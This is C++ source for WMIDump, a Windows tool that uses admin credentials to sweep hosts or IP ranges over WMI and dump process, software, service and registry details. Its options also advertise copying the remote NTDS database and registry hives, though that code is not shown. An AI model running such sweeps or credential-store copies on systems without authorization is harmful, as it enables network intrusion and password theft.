//
// gcc WMIDump.cpp -o WMIDump.exe -lole32 -loleaut32 -lwbemuuid -lnetapi32
//

#define _WIN32_WINNT 0x0500
#define WINVER       0x0500

#define STRICT
#define WIN32_LEAN_AND_MEAN

#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <process.h>
#include <wbemidl.h>
#include <lm.h>
#include "WMIDump.h"

#pragma comment( lib, "kernel32.lib" )
#pragma comment( lib, "user32.lib" )
#pragma comment( lib, "ole32.lib" )
#pragma comment( lib, "oleaut32.lib" )
#pragma comment( lib, "wbemuuid.lib" )
#pragma comment( lib, "netapi32.lib" )

#define MAX_THREADS 64

VOID        RemoveBackslashes( CHAR *szText );
BOOL                IsIPRange( CHAR *szTargetInput, CHAR *szIPNetwork );
VOID                    Usage( VOID );
VOID              ThreadedSub( VOID *pParameter );
VOID               WMIConnect( CHAR *szOptions, CHAR *szTarget, CHAR *szUsername, CHAR *szPassword, CHAR *szWMIRoot, BOOL *bMultipleHosts );
VOID        GetWMIProcessInfo( CHAR *szTarget, IWbemServices *pService, COAUTHIDENTITY *authIdentity, BOOL *bImpersonate, BOOL *bMultipleHosts );
VOID        GetWMIProductInfo( CHAR *szTarget, IWbemServices *pService, COAUTHIDENTITY *authIdentity, BOOL *bImpersonate, BOOL *bMultipleHosts );
VOID        GetWMIServiceInfo( CHAR *szTarget, IWbemServices *pService, COAUTHIDENTITY *authIdentity, BOOL *bImpersonate, BOOL *bMultipleHosts );
VOID       GetWMIRegistryInfo( CHAR *szTarget, IWbemServices *pService, BOOL *bMultipleHosts );
VOID                     Trim( CHAR *szText );
BOOL        SplitRegistryInfo( CHAR *szText, CHAR *szSplitText, CHAR *szSubKeyName, CHAR *szKeyName, CHAR *szValueType );
BOOL                  Connect( CHAR *szTarget, CHAR *szUsername, CHAR *szPassword, BOOL *bMultipleHosts );
BOOL               Disconnect( CHAR *szTarget, BOOL *bMultipleHosts );
VOID        SaveRegistryHives( CHAR *szTarget, IWbemServices *pService, COAUTHIDENTITY *authIdentity, BOOL *bImpersonate, BOOL *bMultipleHosts );
VOID               BackupNTDS( CHAR *szTarget, IWbemServices *pService, COAUTHIDENTITY *authIdentity, BOOL *bImpersonate, BOOL *bMultipleHosts );
BOOL         IsProcessRunning( CHAR *szTarget, IWbemServices *pService, COAUTHIDENTITY *authIdentity, BOOL *bImpersonate, DWORD *dwProcessID, BOOL *bMultipleHosts );
VOID WriteLastErrorToErrorLog( CHAR *szTarget, CHAR *szFunction, DWORD *dwResult, BOOL *bMultipleHosts );
VOID          WriteToErrorLog( CHAR *szTarget, CHAR *szFunction, CHAR *szErrorMsg, BOOL *bMultipleHosts );

typedef struct _THREAD_ARGS
{
	CHAR       Options[ 128 ];
	CHAR        Target[ 128 ];
	CHAR      Username[ 128 ];
	CHAR      Password[ 128 ];
	BOOL MultipleHosts;
} THREAD_ARGS, *PTHREAD_ARGS;

HANDLE hSemaphore;

INT nThreads = 0;

INT main( INT argc, CHAR *argv[] )
{
	DWORD           dwError;
	BOOL  bNoOptionSelected;
	CHAR          szOptions[ 128 ];
	CHAR      szTargetInput[ 128 ];
	CHAR         szUsername[ 128 ];
	CHAR         szPassword[ 128 ];
	FILE        *pInputFile;
	CHAR         szReadLine[ 128 ];
	CHAR           szTarget[ 128 ];
	CHAR        szIPNetwork[ 128 ];
	DWORD                 i;

	PTHREAD_ARGS pThreadArgs;

	hSemaphore = CreateSemaphore( NULL, 1, 1, NULL );

	if ( !CreateDirectory( "Reports", NULL ) )
	{
		dwError = GetLastError();

		if ( dwError != ERROR_ALREADY_EXISTS )
		{
			fprintf( stderr, "ERROR! Cannot create Reports directory.\n" );

			fflush( stderr );

			return 1;
		}
	}

	bNoOptionSelected = TRUE;

	if ( argc == 5 )
	{
		if ( strchr( argv[1], 'i' ) != NULL )
		{
			bNoOptionSelected = FALSE;
		}

		if ( strchr( argv[1], 'p' ) != NULL )
		{
			bNoOptionSelected= FALSE;
		}

		if ( strchr( argv[1], 'r' ) != NULL )
		{
			bNoOptionSelected= FALSE;
		}

		if ( strchr( argv[1], 's' ) != NULL )
		{
			bNoOptionSelected = FALSE;
		}

		if ( strchr( argv[1], 'x' ) != NULL )
		{
			bNoOptionSelected = FALSE;
		}

		if ( strchr( argv[1], 'y' ) != NULL )
		{
			bNoOptionSelected = FALSE;
		}
	}

	if ( !bNoOptionSelected )
	{
		strcpy( szOptions,     argv[1] );
		strcpy( szTargetInput, argv[2] );
		strcpy( szUsername,    argv[3] );
		strcpy( szPassword,    argv[4] );

		printf( "+++++++++++++++++++++++++++++++++++++++++++++++++++\n" );
		printf( "+                                                 +\n" );
		printf( "+   WMIDump v1.0 | https://github.com/reedarvin   +\n" );
		printf( "+                                                 +\n" );
		printf( "+++++++++++++++++++++++++++++++++++++++++++++++++++\n" );
		printf( "\n" );
		printf( "Running WMIDump v1.0 with the following arguments:\n" );
		printf( "[+] Host Input:   \"%s\"\n", szTargetInput );
		printf( "[+] Username:     \"%s\"\n", szUsername );
		printf( "[+] Password:     \"%s\"\n", szPassword );
		printf( "[+] # of Threads: \"64\"\n" );
		printf( "\n" );

		fflush( stdout );

		pInputFile = fopen( szTargetInput, "r" );

		if ( pInputFile != NULL )
		{
			while ( fscanf( pInputFile, "%s", szReadLine ) != EOF )
			{
				RemoveBackslashes( szReadLine );

				strcpy( szTarget, szReadLine );

				while ( nThreads >= MAX_THREADS )
				{
					Sleep( 200 );
				}

				pThreadArgs = (PTHREAD_ARGS)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( THREAD_ARGS ) );

				if ( pThreadArgs != NULL )
				{
					strcpy( pThreadArgs->Options,  szOptions );
					strcpy( pThreadArgs->Target,   szTarget );
					strcpy( pThreadArgs->Username, szUsername );
					strcpy( pThreadArgs->Password, szPassword );

					pThreadArgs->MultipleHosts = TRUE;

					WaitForSingleObject( hSemaphore, INFINITE );

					nThreads++;

					ReleaseSemaphore( hSemaphore, 1, NULL );

					_beginthread( ThreadedSub, 0, (VOID *)pThreadArgs );
				}
			}

			fclose( pInputFile );

			Sleep( 5000 );

			printf( "Waiting for threads to terminate...\n" );

			fflush( stdout );
		}
		else if ( IsIPRange( szTargetInput, szIPNetwork ) )
		{
			for ( i = 1; i < 255; i++ )
			{
				sprintf( szTarget, "%s%d", szIPNetwork, i );

				while ( nThreads >= MAX_THREADS )
				{
					Sleep( 200 );
				}

				pThreadArgs = (PTHREAD_ARGS)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( THREAD_ARGS ) );

				if ( pThreadArgs != NULL )
				{
					strcpy( pThreadArgs->Options,  szOptions );
					strcpy( pThreadArgs->Target,   szTarget );
					strcpy( pThreadArgs->Username, szUsername );
					strcpy( pThreadArgs->Password, szPassword );

					pThreadArgs->MultipleHosts = TRUE;

					WaitForSingleObject( hSemaphore, INFINITE );

					nThreads++;

					ReleaseSemaphore( hSemaphore, 1, NULL );

					_beginthread( ThreadedSub, 0, (VOID *)pThreadArgs );
				}
			}

			Sleep( 5000 );

			printf( "Waiting for threads to terminate...\n" );

			fflush( stdout );
		}
		else
		{
			RemoveBackslashes( szTargetInput );

			strcpy( szTarget, szTargetInput );

			pThreadArgs = (PTHREAD_ARGS)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( THREAD_ARGS ) );

			if ( pThreadArgs != NULL )
			{
				strcpy( pThreadArgs->Options,  szOptions );
				strcpy( pThreadArgs->Target,   szTarget );
				strcpy( pThreadArgs->Username, szUsername );
				strcpy( pThreadArgs->Password, szPassword );

				pThreadArgs->MultipleHosts = FALSE;

				WaitForSingleObject( hSemaphore, INFINITE );

				nThreads++;

				ReleaseSemaphore( hSemaphore, 1, NULL );

				_beginthread( ThreadedSub, 0, (VOID *)pThreadArgs );
			}
		}
	}
	else
	{
		Usage();

		return 1;
	}

	while ( nThreads > 0 )
	{
		Sleep( 200 );
	}

	CloseHandle( hSemaphore );

	return 0;
}

VOID RemoveBackslashes( CHAR szText[] )
{
	CHAR *pLocation;

	pLocation = strstr( szText, "\\\\" );

	if ( pLocation != NULL )
	{
		pLocation++;
		pLocation++;

		strcpy( szText, pLocation );
	}
}

BOOL IsIPRange( CHAR szTargetInput[], CHAR szIPNetwork[] )
{
	BOOL  bReturn;
	DWORD       i;
	DWORD       j;

	bReturn = FALSE;

	if ( strstr( szTargetInput, "1-254" ) != NULL )
	{
		strcpy( szIPNetwork, "" );

		i = 0;
		j = 0;

		while ( szTargetInput[i] != '\0' && j != 3 )
		{
			if ( szTargetInput[i] == '.' )
			{
				j++;
			}
			else
			{
				if ( szTargetInput[i] != '0' && szTargetInput[i] != '1' && szTargetInput[i] != '2' && szTargetInput[i] != '3' && szTargetInput[i] != '4' && szTargetInput[i] != '5' && szTargetInput[i] != '6' && szTargetInput[i] != '7' && szTargetInput[i] != '8' && szTargetInput[i] != '9' )
				{
					break;
				}
			}

			szIPNetwork[i] = szTargetInput[i];

			i++;
		}

		szIPNetwork[i] = '\0';

		if ( j == 3 )
		{
			bReturn = TRUE;
		}
	}

	return bReturn;
}

VOID Usage( VOID )
{
	printf( "WMIDump v1.0 | https://github.com/reedarvin\n" );
	printf( "\n" );
	printf( "Usage: WMIDump [-iprsxy] <hostname | ip range | ip input file> <username> <password>\n" );
	printf( "\n" );
	printf( "[-iprsxy]                              -- required argument\n" );
	printf( "<hostname | ip range | ip input file>  -- required argument\n" );
	printf( "<username>                             -- optional argument\n" );
	printf( "<password>                             -- optional argument\n" );
	printf( "\n" );
	printf( "If the <username> and <password> arguments are both plus signs (+), the\n" );
	printf( "existing credentials of the user running this utility will be used.\n" );
	printf( "\n" );
	printf( "Examples:\n" );
	printf( "WMIDump -i 10.10.10.10 + +\n" );
	printf( "WMIDump -i 10.10.10.10 administrator password\n" );
	printf( "WMIDump -i 10.10.10.10 domain\\admin password\n" );
	printf( "\n" );
	printf( "WMIDump -i 192.168.1-254 + +\n" );
	printf( "WMIDump -i 192.168.1-254 administrator password\n" );
	printf( "WMIDump -i 192.168.1-254 domain\\admin password\n" );
	printf( "\n" );
	printf( "WMIDump -i IPInputFile.txt + +\n" );
	printf( "WMIDump -i IPInputFile.txt administrator password\n" );
	printf( "WMIDump -i IPInputFile.txt domain\\admin password\n" );
	printf( "\n" );
	printf( "\n" );
	printf( "==== WMIDump Advanced Features ====\n" );
	printf( "\n" );
	printf( "-i  -- Dump WMI Product Information\n" );
	printf( "-p  -- Dump WMI Process Information\n" );
	printf( "-r  -- Dump WMI Registry Information\n" );
	printf( "-s  -- Dump WMI Service Information\n" );
	printf( "-x  -- Backup Remote NTDS\n" );
	printf( "-y  -- Save Remote Registry Hives\n" );
	printf( "\n" );
	printf( "\n" );
	printf( "==== Retrieving Registry Information ====\n" );
	printf( "\n" );
	printf( "The registry key/value pairs that are queried for each host are included\n" );
	printf( "in the RegistryInfo.input file.\n" );
	printf( "\n" );
	printf( "(Written by Reed Arvin | reedlarvin@gmail.com)\n" );

	fflush( stdout );
}

VOID ThreadedSub( VOID *pParameter )
{
	CHAR      szOptions[ 128 ];
	CHAR       szTarget[ 128 ];
	CHAR     szUsername[ 128 ];
	CHAR     szPassword[ 128 ];
	BOOL bMultipleHosts;
	CHAR      szWMIRoot[ 128 ];

	PTHREAD_ARGS pThreadArgs;

	pThreadArgs = (PTHREAD_ARGS)pParameter;

	strcpy( szOptions,  pThreadArgs->Options );
	strcpy( szTarget,   pThreadArgs->Target );
	strcpy( szUsername, pThreadArgs->Username );
	strcpy( szPassword, pThreadArgs->Password );

	bMultipleHosts = pThreadArgs->MultipleHosts;

	HeapFree( GetProcessHeap(), 0, pThreadArgs );

	if ( bMultipleHosts )
	{
		printf( "Spawning thread for host %s...\n", szTarget );

		fflush( stdout );
	}

	if ( strcmp( szUsername, "+" ) == 0 && strcmp( szPassword, "+" ) == 0 )
	{
		strcpy( szUsername, "" );
		strcpy( szPassword, "" );
		strcpy( szWMIRoot,  "root\\cimv2" );

		WMIConnect( szOptions, szTarget, szUsername, szPassword, szWMIRoot, &bMultipleHosts );

		strcpy( szWMIRoot, "root\\default" );

		WMIConnect( szOptions, szTarget, szUsername, szPassword, szWMIRoot, &bMultipleHosts );
	}
	else
	{
		strcpy( szWMIRoot, "root\\cimv2" );

		WMIConnect( szOptions, szTarget, szUsername, szPassword, szWMIRoot, &bMultipleHosts );

		strcpy( szWMIRoot, "root\\default" );

		WMIConnect( szOptions, szTarget, szUsername, szPassword, szWMIRoot, &bMultipleHosts );
	}

	WaitForSingleObject( hSemaphore, INFINITE );

	nThreads--;

	ReleaseSemaphore( hSemaphore, 1, NULL );

	_endthread();
}

VOID WMIConnect( CHAR szOptions[], CHAR szTarget[], CHAR szUsername[], CHAR szPassword[], CHAR szWMIRoot[], BOOL *bMultipleHosts )
{
	CHAR                   *pLocation;
	DWORD              dwTextLocation;
	DWORD                           i;
	CHAR                 szDomainName[ 128 ];
	DWORD                           j;
	CHAR               szTempUsername[ 128 ];
	BOOL                 bImpersonate;
	HRESULT                   hResult;
	IWbemLocator            *pLocator;
	CHAR               szFullUsername[ 128 ];
	CHAR            szNetworkResource[ 128 ];
	WCHAR               wszDomainName[ 256 ];
	WCHAR                 wszUsername[ 256 ];
	WCHAR                 wszPassword[ 256 ];
	WCHAR             wszFullUsername[ 256 ];
	WCHAR          wszNetworkResource[ 256 ];
	BSTR              bszFullUsername;
	BSTR                  bszPassword;
	BSTR           bszNetworkResource;
	IWbemServices           *pService;
	COAUTHIDENTITY       authIdentity;
	CHAR                   szFunction[ 128 ];

	pLocation = strstr( szUsername, "\\" );

	if ( pLocation != NULL )
	{
		dwTextLocation = (INT)( pLocation - szUsername );

		i = 0;

		while ( i < dwTextLocation )
		{
			szDomainName[i] = szUsername[i];

			i++;
		}

		szDomainName[i] = '\0';

		i = dwTextLocation + 1;

		j = 0;

		while ( i < strlen( szUsername ) )
		{
			szTempUsername[j] = szUsername[i];

			i++;
			j++;
		}

		szTempUsername[j] = '\0';
	}
	else
	{
		if ( strcmp( szUsername, "" ) != 0 )
		{
			strcpy( szDomainName, szTarget );
		}
		else
		{
			strcpy( szDomainName, "" );
		}

		strcpy( szTempUsername, szUsername );
	}

	bImpersonate = FALSE;

	if ( strcmp( szDomainName, "" ) == 0 && strcmp( szTempUsername, "" ) == 0 )
	{
		bImpersonate = TRUE;
	}

	hResult = CoInitializeEx( 0, COINIT_MULTITHREADED );

	if ( SUCCEEDED( hResult ) )
	{
		if ( bImpersonate )
		{
			hResult = CoInitializeSecurity( NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL );
		}
		else
		{
			hResult = CoInitializeSecurity( NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IDENTIFY, NULL, EOAC_NONE, NULL );
		}

		if (SUCCEEDED( hResult ) )
		{
			pLocator = NULL;

			hResult = CoCreateInstance( CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (PVOID *)&pLocator );

			if (SUCCEEDED( hResult ) )
			{
				sprintf( szFullUsername, "%s\\%s", szDomainName, szTempUsername );

				sprintf( szNetworkResource, "\\\\%s\\%s", szTarget, szWMIRoot );

				MultiByteToWideChar( CP_ACP, 0, szDomainName, strlen( szDomainName ) + 1, wszDomainName, sizeof( wszDomainName ) / sizeof( wszDomainName[0] ) );
				MultiByteToWideChar( CP_ACP, 0, szTempUsername, strlen( szTempUsername ) + 1, wszUsername, sizeof( wszUsername ) / sizeof( wszUsername[0] ) );
				MultiByteToWideChar( CP_ACP, 0, szPassword, strlen( szPassword ) + 1, wszPassword, sizeof( wszPassword ) / sizeof( wszPassword[0] ) );
				MultiByteToWideChar( CP_ACP, 0, szFullUsername, strlen( szFullUsername ) + 1, wszFullUsername, sizeof( wszFullUsername ) / sizeof( wszFullUsername[0] ) );
				MultiByteToWideChar( CP_ACP, 0, szNetworkResource, strlen( szNetworkResource ) + 1, wszNetworkResource, sizeof( wszNetworkResource ) / sizeof( wszNetworkResource[0] ) );

				bszFullUsername    = SysAllocString( wszFullUsername );
				bszPassword        = SysAllocString( wszPassword );
				bszNetworkResource = SysAllocString( wszNetworkResource );

				pService = NULL;

				if ( bImpersonate )
				{
					hResult = pLocator->ConnectServer( bszNetworkResource, NULL, NULL, NULL, NULL, NULL, NULL, &pService );
				}
				else
				{
					hResult = pLocator->ConnectServer( bszNetworkResource, bszFullUsername, bszPassword, NULL, NULL, NULL, NULL, &pService );
				}

				if ( SUCCEEDED( hResult ) )
				{
					if ( bImpersonate )
					{
						hResult = CoSetProxyBlanket( pService, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE );
					}
					else
					{
						memset( &authIdentity, 0, sizeof( COAUTHIDENTITY ) );

						authIdentity.User           = (USHORT*)wszUsername;
						authIdentity.UserLength     = wcslen( wszUsername );
						authIdentity.Domain         = (USHORT*)wszDomainName;
						authIdentity.DomainLength   = wcslen( wszDomainName );
						authIdentity.Password       = (USHORT*)wszPassword;
						authIdentity.PasswordLength = wcslen( wszPassword );

						authIdentity.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;

						hResult = CoSetProxyBlanket( pService, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, &authIdentity, EOAC_NONE );
					}

					if ( SUCCEEDED( hResult ) )
					{
						if ( strcmp( szWMIRoot, "root\\cimv2" ) == 0 )
						{
							if ( strchr( szOptions, 'p' ) != NULL )
							{
								GetWMIProcessInfo( szTarget, pService, &authIdentity, &bImpersonate, bMultipleHosts );
							}

							if ( strchr( szOptions, 'i' ) != NULL )
							{
								GetWMIProductInfo( szTarget, pService, &authIdentity, &bImpersonate, bMultipleHosts );
							}

							if ( strchr( szOptions, 's' ) != NULL )
							{
								GetWMIServiceInfo( szTarget, pService, &authIdentity, &bImpersonate, bMultipleHosts );
							}

							if ( strchr( szOptions, 'y' ) != NULL )
							{
								if ( bImpersonate )
								{
									SaveRegistryHives( szTarget, pService, &authIdentity, &bImpersonate, bMultipleHosts );
								}
								else
								{
									if ( Connect( szTarget, szUsername, szPassword, bMultipleHosts ) )
									{
										SaveRegistryHives( szTarget, pService, &authIdentity, &bImpersonate, bMultipleHosts );

										Disconnect( szTarget, bMultipleHosts );
									}
								}
							}

							if ( strchr( szOptions, 'x' ) != NULL )
							{
								if ( bImpersonate )
								{
									BackupNTDS( szTarget, pService, &authIdentity, &bImpersonate, bMultipleHosts );
								}
								else
								{
									if ( Connect( szTarget, szUsername, szPassword, bMultipleHosts ) )
									{
										BackupNTDS( szTarget, pService, &authIdentity, &bImpersonate, bMultipleHosts );

										Disconnect( szTarget, bMultipleHosts );
									}
								}
							}
						}

						if ( strcmp( szWMIRoot, "root\\default" ) == 0 )
						{
							if ( strchr( szOptions, 'r' ) != NULL )
							{
								GetWMIRegistryInfo( szTarget, pService, bMultipleHosts );
							}
						}
					}
					else
					{
						strcpy( szFunction, "CoSetProxyBlanket (WMIConnect)" );

						WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
					}

					pService->Release();
				}
				else
				{
					strcpy( szFunction, "ConnectServer (WMIConnect)" );

					WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
				}

				SysFreeString( bszNetworkResource );
				SysFreeString( bszFullUsername );
				SysFreeString( bszPassword );

				pLocator->Release();
			}
			else
			{
				strcpy( szFunction, "CoCreateInstance (WMIConnect)" );

				WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
			}
		}
		else
		{
			strcpy( szFunction, "CoInitializeSecurity (WMIConnect)" );

			WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
		}
	}
	else
	{
		strcpy( szFunction, "CoInitializeEx (WMIConnect)" );

		WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
	}

	CoUninitialize();
}

VOID GetWMIProcessInfo( CHAR szTarget[], IWbemServices *pService, COAUTHIDENTITY *authIdentity, BOOL *bImpersonate, BOOL *bMultipleHosts )
{
	DWORD                                    i;
	CHAR                       szQueryLanguage[ 128 ];
	CHAR                               szQuery[ 128 ];
	WCHAR                     wszQueryLanguage[ 256 ];
	WCHAR                             wszQuery[ 256 ];
	BSTR                      bszQueryLanguage;
	BSTR                              bszQuery;
	IEnumWbemClassObject          *pEnumerator;
	HRESULT                            hResult;
	BOOL                          bUseGetOwner;
	BSTR                          bszClassName;
	BSTR                         bszMethodName;
	IWbemClassObject                   *pClass;
	IWbemClassObject              *pGetOwnerIn;
	IWbemClassObject             *pGetOwnerOut;
	IWbemClassObject                  *pObject;
	ULONG                            uReturned;
	VARIANT                         vtProperty;
	CHAR                         szProcessName[ 128 ];
	CHAR                      szExecutablePath[ 512 ];
	CHAR                         szCommandLine[ 1024 ];
	CHAR                     szProcessUsername[ 128 ];
	CHAR                   szProcessDomainName[ 128 ];
	CHAR                 szProcessFullUsername[ 128 ];
	DWORD                          dwProcessID;
	BSTR                         bszObjectPath;
	FILE                          *pOutputFile;
	CHAR                            szFunction[ 128 ];

	i = 0;

	strcpy( szQueryLanguage, "WQL" );
	strcpy( szQuery,         "Select * from Win32_Process" );

	MultiByteToWideChar( CP_ACP, 0, szQueryLanguage, strlen( szQueryLanguage ) + 1, wszQueryLanguage, sizeof( wszQueryLanguage ) / sizeof( wszQueryLanguage[0] ) );
	MultiByteToWideChar( CP_ACP, 0, szQuery, strlen( szQuery ) + 1, wszQuery, sizeof( wszQuery ) / sizeof( wszQuery[0] ) );

	bszQueryLanguage = SysAllocString( wszQueryLanguage );
	bszQuery         = SysAllocString( wszQuery );

	pEnumerator = NULL;

	hResult = pService->ExecQuery( bszQueryLanguage, bszQuery, WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator );

	if ( SUCCEEDED( hResult ) )
	{
		if ( *bImpersonate )
		{
			hResult = CoSetProxyBlanket( pEnumerator, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE );
		}
		else
		{
			hResult = CoSetProxyBlanket( pEnumerator, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, authIdentity, EOAC_NONE );
		}

		bUseGetOwner = FALSE;

		bszClassName  = SysAllocString( L"Win32_Process" );
		bszMethodName = SysAllocString( L"GetOwner" );

		pClass       = NULL;
		pGetOwnerIn  = NULL;
		pGetOwnerOut = NULL;

		hResult = pService->GetObject( bszClassName, 0, NULL, &pClass, NULL );

		if ( SUCCEEDED( hResult ) )
		{
			hResult = pClass->GetMethod( bszMethodName, 0, &pGetOwnerIn, &pGetOwnerOut );

			if ( SUCCEEDED( hResult ) )
			{
				bUseGetOwner = TRUE;
			}
		}

		while ( pEnumerator )
		{
			pObject = NULL;

			hResult = pEnumerator->Next( WBEM_INFINITE, 1, &pObject, &uReturned );

			if ( SUCCEEDED( hResult ) )
			{
				if ( uReturned == 0 )
				{
					break;
				}

				strcpy( szProcessName,         "" );
				strcpy( szExecutablePath,      "" );
				strcpy( szCommandLine,         "" );
				strcpy( szProcessUsername,     "" );
				strcpy( szProcessDomainName,   "" );
				strcpy( szProcessFullUsername, "" );

				dwProcessID = NULL;

				hResult = pObject->Get( L"Name", 0, &vtProperty, NULL, NULL );
				
				WideCharToMultiByte( CP_ACP, 0, vtProperty.bstrVal, -1, szProcessName, 128, NULL, NULL );

				VariantClear( &vtProperty );

				hResult = pObject->Get( L"ProcessId", 0, &vtProperty, NULL, NULL );

				dwProcessID = vtProperty.uintVal;

				VariantClear( &vtProperty );

				hResult = pObject->Get( L"ExecutablePath", 0, &vtProperty, NULL, NULL );
				
				WideCharToMultiByte( CP_ACP, 0, vtProperty.bstrVal, -1, szExecutablePath, 512, NULL, NULL );

				VariantClear( &vtProperty );

				hResult = pObject->Get( L"CommandLine", 0, &vtProperty, NULL, NULL );
				
				WideCharToMultiByte( CP_ACP, 0, vtProperty.bstrVal, -1, szCommandLine, 1024, NULL, NULL );

				VariantClear( &vtProperty );

				hResult = pObject->Get( L"__PATH", 0, &vtProperty, 0, 0 );

				bszObjectPath = vtProperty.bstrVal;

				VariantClear( &vtProperty );

				if ( bUseGetOwner )
				{
					hResult = pService->ExecMethod( bszObjectPath, bszMethodName, 0, NULL, pGetOwnerIn, &pGetOwnerOut, NULL );

					if ( SUCCEEDED( hResult ) )
					{
						hResult = pGetOwnerOut->Get( L"User", 0, &vtProperty, NULL, 0 );

						WideCharToMultiByte( CP_ACP, 0, vtProperty.bstrVal, -1, szProcessUsername, 128, NULL, NULL );

						VariantClear( &vtProperty );

						hResult = pGetOwnerOut->Get( L"Domain", 0, &vtProperty, NULL, 0 );

						WideCharToMultiByte( CP_ACP, 0, vtProperty.bstrVal, -1, szProcessDomainName, 128, NULL, NULL );

						VariantClear( &vtProperty );

						if ( strcmp( szProcessUsername, "" ) != 0 )
						{
							sprintf( szProcessFullUsername, "%s\\%s", szProcessDomainName, szProcessUsername );
						}
					}
				}

				pObject->Release();

				if ( int( szExecutablePath[0] ) < 32 || int( szExecutablePath[0] ) > 255 )
				{
					strcpy( szExecutablePath, "" );
				}

				if ( int( szCommandLine[0] ) < 32 || int( szCommandLine[0] ) > 255 )
				{
					strcpy( szCommandLine, "" );
				}

				if ( !*bMultipleHosts )
				{
					if ( i == 0 )
					{
						printf( "\n" );
						printf( "+++++++++++++++++++++++++++++++++++++++++++++++++++\n" );
						printf( "+++++           PROCESS INFORMATION           +++++\n" );
						printf( "+++++++++++++++++++++++++++++++++++++++++++++++++++\n" );
						printf( "\n" );

						i++;
					}

					printf( "Process Name: %s\n", szProcessName );
					printf( "Process ID:   %d\n", dwProcessID );
					printf( "Owner:        %s\n", szProcessFullUsername );
					printf( "File Path:    %s\n", szExecutablePath );
					printf( "Command Line: %s\n", szCommandLine );

					printf( "\n" );

					fflush( stdout );
				}

				WaitForSingleObject( hSemaphore, INFINITE );

				pOutputFile = fopen( "Reports\\ProcessInfo.txt", "r" );

				if ( pOutputFile != NULL )
				{
					fclose( pOutputFile );
				}
				else
				{
					pOutputFile = fopen( "Reports\\ProcessInfo.txt", "w" );

					if ( pOutputFile != NULL )
					{
						fprintf( pOutputFile, "NOTE: This file is tab separated. Open with Excel to view and sort information.\n" );
						fprintf( pOutputFile, "\n" );
						fprintf( pOutputFile, "Hostname\tProcess Name\tProcess ID\tOwner\tFile Path\tCommand Line\n" );

						fclose( pOutputFile );
					}
				}

				pOutputFile = fopen( "Reports\\ProcessInfo.txt", "a+" );

				if ( pOutputFile != NULL )
				{
					fprintf( pOutputFile, "%s\t%s\t%d\t%s\t%s\t%s\n", szTarget, szProcessName, dwProcessID, szProcessFullUsername, szExecutablePath, szCommandLine );

					fclose( pOutputFile );
				}

				ReleaseSemaphore( hSemaphore, 1, NULL );
			}
		}

		SysFreeString( bszMethodName );
		SysFreeString( bszClassName );

		if ( bUseGetOwner )
		{
			pClass->Release();
		}
	}
	else
	{
		strcpy( szFunction, "ExecQuery (GetWMIProcessInfo)" );

		WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
	}

	SysFreeString( bszQueryLanguage );
	SysFreeString( bszQuery );
}

VOID GetWMIProductInfo( CHAR szTarget[], IWbemServices *pService, COAUTHIDENTITY *authIdentity, BOOL *bImpersonate, BOOL *bMultipleHosts )
{
	DWORD                                i;
	CHAR                   szQueryLanguage[ 128 ];
	CHAR                           szQuery[ 128 ];
	WCHAR                 wszQueryLanguage[ 256 ];
	WCHAR                         wszQuery[ 256 ];
	BSTR                  bszQueryLanguage;
	BSTR                          bszQuery;
	IEnumWbemClassObject      *pEnumerator;
	HRESULT                        hResult;
	IWbemClassObject              *pObject;
	ULONG                        uReturned;
	CHAR                     szDisplayName[ 128 ];
	CHAR                     szInstallDate[ 128 ];
	CHAR                 szInstallLocation[ 1024 ];
	VARIANT                     vtProperty;
	FILE                      *pOutputFile;
	CHAR                        szFunction[ 128 ];

	i = 0;

	strcpy( szQueryLanguage, "WQL" );
	strcpy( szQuery,         "Select * from Win32_Product" );

	MultiByteToWideChar( CP_ACP, 0, szQueryLanguage, strlen( szQueryLanguage ) + 1, wszQueryLanguage, sizeof( wszQueryLanguage ) / sizeof( wszQueryLanguage[0] ) );
	MultiByteToWideChar( CP_ACP, 0, szQuery, strlen( szQuery ) + 1, wszQuery, sizeof( wszQuery ) / sizeof( wszQuery[0] ) );

	bszQueryLanguage = SysAllocString( wszQueryLanguage );
	bszQuery         = SysAllocString( wszQuery );

	pEnumerator = NULL;

	hResult = pService->ExecQuery( bszQueryLanguage, bszQuery, WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator );

	if ( SUCCEEDED( hResult ) )
	{
		if ( *bImpersonate )
		{
